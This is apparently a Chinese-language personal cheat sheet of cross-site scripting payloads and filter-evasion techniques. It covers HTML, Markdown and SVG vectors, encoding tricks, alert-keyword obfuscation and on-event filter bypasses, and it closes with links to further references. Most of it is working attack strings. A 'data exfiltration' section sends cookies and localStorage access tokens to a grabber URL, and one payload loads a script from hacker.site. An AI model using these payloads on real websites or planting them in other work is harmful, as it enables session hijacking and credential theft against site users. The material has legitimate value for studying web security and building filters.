# 基础语法

1. `$("#xx")['html'](一些参数)`  调用 dom 的函数
2. 模板字符串 ``some text``, 可以跨行。模板字符串可以嵌套: `alert(`aaa ${`11`}`)`
3. `//` 是注释，`/aaa/`是正则，`/aa///aaa/` 是正则除正则，`/a/b/c/d`是连续除法，`/**/`代替空格，`//`被 Nginx 解析成文件夹，
4. `alert(a);var a = 'xss';`JS 可以先使用后定义变量
5. 可以通过 `+-*/``instanceof`等运算符号来进行字符串和表达式的连接，来凑格式，只要让 alert(1) 是子表达式就行。
6. `<script><!-- <script></script>  --></script>` 注释里的 script 是可以执行的。
7. `{a:1}` 字典
8. html 注释：

```javascript
多行注释：
<!-- some js --!> 
<!-- some js -->
/* some js */

单行注释：
// some js
-->some js
<!-- some js
/* some js
```

1. 可用于占位的符号

`<img/2233/src[空格、换行、制表符]=[空格、换行、制表符]1/2233/onerror[空格、换行、制表符]=[空格、换行、制表符]"alert/**/(1)"22/33></img[空格、换行、制表符]>`等等

1. 换行绕过一些正则

```python
<input value=1 type=image src onerror
=alert(`1`) type="text">
```



# 基础用法

## 数据外带

```python
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>

<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>

<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>

<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>
```

## XSS in HTML/Applications

```python
Basic Payload:
<script>alert('XSS')</script>
双写：<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert("XSS")</script>
双引号绕过：><script>alert(String.fromCharCode(88,83,83))</script>

Img tag payload:
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert("XSS");>
><img src=x onerror=alert(String.fromCharCode(88,83,83));>

<iframe src=javascript:alert('xss');height=0 width=0 /><iframe> 
<A/1/hREf="javascript:\u0061lert(3)">show 需要点击</A> 
<oBjECt/2/dAtA="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<ScRiPt/3>\u0061lert(2)</ScRiPt>
<svg/4/onLOad="\u0061lert`4`"/>
  
<script src="data:,alert(1);"></script>

<a href="javascript:alert(1)">show</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">show</a>
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<object data="//hacker.site/xss.swf">  #可使用https://github.com/evilcos/xss.swf
<embedcode="//hacker.site/xss.swf"allowscriptaccess=always>
```

## XSS in Markdown

```python
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

## XSS in SVG (short)

```python
<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

# 绕过

奇怪的payload，也许可以用来绕过一些正则

- `Window.alert?.()` = `alert?.(1)`
- `(window?.alert)`xss`` = `(alert)`xss``

## 绕过 | 其他弹窗关键词

```python
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>console.log(1)</script>

<script>self['al'+'ert'](1)</script>
<script>parent['al'+'ert'](1)</script>
<script>frames['al'+'ert'](1)</script>
<script>window['al'+'ert'](1)</script>

然后就自己变通：
<script>self['al'+'ert']`xss`</script>

降维打击：
<script>top[11189117..toString(32)](1);</script>   
//parseInt('alert',30)
//8680439..toString(30)
<script>xxx%27]);Function(atob`YWxlcnQoInhzcyIp`)()//</script>
Function('ale'+'rt(1)')();
new Function`alert`6``;


"+" 号可能需要编码为 %2B

setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`alert(14)```;

eval('ale'+'rt(0)');
<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</script>

top['ale'+'rt']()
a\u006cert() 
alert``
top['a\u006ce'+'rt']``
```

## 绕过 ｜ 双引号

```python
alert(/xss/)  // 正则表达式
<script>xxx%27]);Function(atob`YWxlcnQoInhzcyIp`)()//</script>  // 模板字符串
<script>top[11189117..toString(32)](1);</script>   // 函数计算
new Function`alert`6``;
Set.constructor`alert(14)```;
<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</script>
<ScRiPt/3>\u0061lert(2)</ScRiPt>
```

## 绕过 ｜ 括号

```python
alert`1`
<oBjECt/2/dAtA="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<svg/4/onLOad="\u0061lert`4`"/>
new Function`alert`6``;
top['a\u006ce'+'rt']``
Set.constructor`alert(14)```;
<video src onerror=a="%2",location="javascript:aler"+"t"+a+"81"+a+"9"> 组合%28和%29
<video src onerror="javascript:window.onerror=alert;throw 1">
```

## 绕过 ｜ 空格

假设payload如下： 

```
html><imgAAsrcAAonerrorBB=BBalertCC(1)DD</html>
```

A位置可填充`/，/123/，%09，%0A，%0C，%0D，%20 `

B位置可填充`%09，%0A，%0C，%0D，%20`

C位置可填充`%0B`，如果加双引号，则可以填充`/**/，%09，%0A ，%0C，%0D，%20` 

D位置可填充`%09，%0A，%0C，%0D，%20，//，>`

函数配合拼接

```python
<video/src/onerror=top.alert(1);>
<video/src/onerror=top[`al`+`ert`](1);>
<video/src/onerror=self[`al`+`ert`](1);>
<video/src/onerror=parent[`al`+`ert`](1);>
<video/src/onerror=window[`al`+`ert`](1);>
<video/src/onerror=frames[`al`+`ert`](1);>
<video/src/onerror=content[`al`+`ert`](1);>
<body/onload=eval(alert(1));>
<body/onload=eval(`al`+`ert(1)`);>
<body/onload=open(alert(1));>
<body/onload=document.write(alert(1));>
<body/onload=setTimeout(alert(1));>
<body/onload=setInterval(alert(1));>
<body/onload=Set.constructor(alert(1))()>
<body/onload=Map.constructor(alert(1))()>
<body/onload=Array.constructor(alert(1))()>
<body/onload=WeakSet.constructor(alert(1))()>
<body/onload=constructor.constructor(alert(1))>
<video/src/onerror=[1].map(alert);>
<video/src/onerror=[1].map(eval('al'+'ert'));>
<video/src/onerror=[1].find(alert);>
<video/src/onerror=[1].every(alert);>
<video/src/onerror=[1].filter(alert);>
<video/src/onerror=[1].forEach(alert);>
<video/src/onerror=[1].findIndex(alert);>
```

## 绕过 ｜ 编码

```python
绕过全部转换为大写：
<IMG SRC="X" ONERROR=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
古字符与 toUppercase() : <ſcript src="https://xxxx/j.js"></script>
```



## 字符编码

可使用 Unicode 编码绕过

```python
<script>\u0061lert(1)</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>eval("\u0061lert(1)")</script>
<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
```

十进制，八进制，十六进制

则除了 Unicode 外，我们还可以采用多种编码

```python
<img src=x onerror="\u0061lert(1)"/>
<img src=x onerror="eval('\141lert(1)')"/>
<img src=x onerror="eval('\x61lert(1)')"/>
<img src=x onerror="&#x0061;lert(1)"/>
<img src=x onerror="&#97;lert(1)"/>
<img src=x onerror="eval('\a\l\ert(1)')"/>
```

同时可使用多种编码

```python
<img src=x onerror="\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>
```

## 构造字符串

通常 alert 关键字被阻止，但是很可能未检测到“ ale” +“ rt”。

JavaScript 具有一些可用于创建字符串的函数。

```python
/ale/.source+/rt/.source
String.fromCharCode(97,108,101,114,116)
atob("YWxlcnQ=")
17795081..toString(36)

<img src onerror=_=alert,_(1)>
<img src alt=al lang=ert onerror=top[alt+lang](1)>
<img src onerror=top[a='al',b='ev',b+a]('alert(1)')>
<img src onerror=['ale'+'rt'].map(top['ev'+'al'])[0]['valu'+'eOf']()(1)>
```

`/ale/.source+/rt/.source`XSS`` 是不行的

需要结合 eval 或者 top

```
top[/ale/.source+/rt/.source](1)
eval((/ale/.source+/rt/.source))(1)
```

`/ale/.source+/rt/.source` 只是字符串拼接，没法后直接跟() 执行函数

## 绕过弱 <script> 标签过滤 （绕过其他标签过滤同理）

简单的过滤器无法涵盖所有可能的情况，所以可以绕开它们。 以下示例仅是对弱规则的一些绕过。

```python
<ScRiPt>alert(1);</ScRiPt> 	               # 大写和小写字符
<ScRiPt>alert(1);                          # 大写和小写字符，不带结束标记
<script/random>alert(1);</script>          # 标签后加随机字符串
<script                             
>alert(1);</script>                        # 标签后加换行符
<scr<script>ipt>alert(1)</scr<script>ipt>  # 嵌套标签(双写)
<scr\x00ipt>alert(1)</scr\x00ipt>          # NULL字节
```

## 绕过 on 事件过滤

从防御的角度来看，解决此问题方案是过滤所有以 on 开头的事件，防止 XSS。

这是一个被广泛使用的正则表达式  (on\w+\s*=)
由于HTML和浏览器“动态性”的结合，我们可以轻松绕过这个过滤器：

```python
<svg/onload=alert(1)>
<svg//////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
```

因此有了“升级”版过滤器：(?i)([\s\"'`;\/0-9\=]+on\w+\s*=)
但是仍然存在问题。 某些浏览器将一些特殊字符转换为空格，因此 \ s 元字符不足以覆盖所有可能的字符。

例如以下的一些绕过方法：

```python
<svg onload%09=alert(1)> #适用于除Safari以外的所有浏览器
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2C%3B=alert(1)>
<svg onload%0B=alert(1)> #只适用IE
```

在事件名称（例如 onload）和等号（=）字符之间或在事件名称之前可用的控制字符列表，

```python
IExplorer = [0x09,0x0B,0x0C,0x20,0x3B]
Chrome = [0x09,0x20,0x28,0x2C,0x3B]
Safari = [0x2C,0x3B]
FireFox = [0x09,0x20,0x28,0x2C,0x3B]
Opera = [0x09,0x20,0x2C,0x3B]
Android = [0x09,0x20,0x28,0x2C,0x3B]
```

迄今为止，有效防守的正则表达式规则应为：

```python
(?i)([\s\"'`;\/0-9\=\x00\x09\0A\x0B\x0C\0x0D\x3B\x2C\x28\x3B]+on\w+[\s\x00\x09\0A\x0B\x0C\0x0D\x3B\x2C\x28\x3B]*?=)
```

## 除 <script> 标签 使用HTML事件

事件是访问者与HTML DOM之间交互性的方式； 这只需通过执行客户端代码（JavaScript）来实现。

几乎所有事件处理程序标识符都以on开头，后跟事件名称。 最常用的一种是onerror，

常用On事件

```python
onsearch
onwebkitanimationend
onwebkitanimationiteration
onwebkitanimationstart
onwebkittransitionend
onabort
onblur
oncancel
oncanplay
oncanplaythrough
onchange
onclick
onclose
oncontextmenu
oncuechange
ondblclick
ondrag
ondragend
ondragenter
ondragleave
ondragover
ondragstart
ondrop
ondurationchange
onemptied
onended
onerror
onfocus
onformdata
oninput
oninvalid
onkeydown
onkeypress
onkeyup
onload
onloadeddata
onloadedmetadata
onloadstart
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onpause
onplay
onplaying
onprogress
onratechange
onreset
onresize
onscroll
onseeked
onseeking
onselect
onstalled
onsubmit
onsuspend
ontimeupdate
ontoggle
onvolumechange
onwaiting
onwheel
onauxclick
ongotpointercapture
onlostpointercapture
onpointerdown
onpointermove
onpointerup
onpointercancel
onpointerover
onpointerout
onpointerenter
onpointerleave
onselectstart
onselectionchange
onanimationend
onanimationiteration
onanimationstart
ontransitionend
onafterprint
onbeforeprint
onbeforeunload
onhashchange
onlanguagechange
onmessage
onmessageerror
onoffline
ononline
onpagehide
onpageshow
onpopstate
onrejectionhandled
onstorage
onunhandledrejection
onunload
```

这里有很多其他事件 http://help.dottoro.com/lhwfcplu.php

其他标签及事件 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

以下是一些 HTML 4 标签示例：

```python
<body onload=alert(1)>
<input type=image src=x:x onerror=alert(1)>
<isindex onmouseover="alert(1)" >
<form oninput=alert(1)><input></form>
<textarea autofocus onfocus=alert(1)>
<input oncut=alert(1)>
```

以下是一些HTML 5标签示例：

```python
<svg onload=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror="alert(1)">
<marquee onstart=alert(1)>
```

## 注释符

对于 html 的注释符有两种写法，一种不对称的`<!-- -->`和另一种对称的`<!-- --!>`

# 特殊场景

## input 标签

插入点在 type 之前

`<input value="" type=image src onerror=alert(`xss`) "" type="hidden" >` 这样可以弹窗

但如果插入点在 type 之后就不行了，比如下面这个就不行了。

```
<input type="hidden" value="" type=image src onerror=alert(`xss`) "">
```



**html inline js 转义就是做无用功**

# 资料

```java
XSS过滤速查表：https://owasp.org/www-community/xss-filter-evasion-cheatsheet
XSS Auditor绕过：https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
浏览器逻辑漏洞？？？：https://github.com/Metnew/uxss-db
稍微也有点干货：https://www.cnblogs.com/linuxsec/articles/9216488.html
带一点修复方法，累了，看吐了，有空在看吧：https://blog.csdn.net/weixin_32562973/article/details/112770190      https://blog.csdn.net/change518/article/details/51024706/      
xss获取记住密码：http://www.vuln.cn/8054
xss总结？？敢叫这个名字？是不是有点东西：https://cloud.tencent.com/developer/article/1373688
xss游戏通关笔记xss-labs ： https://0verwatch.top/xss-game.html#
```

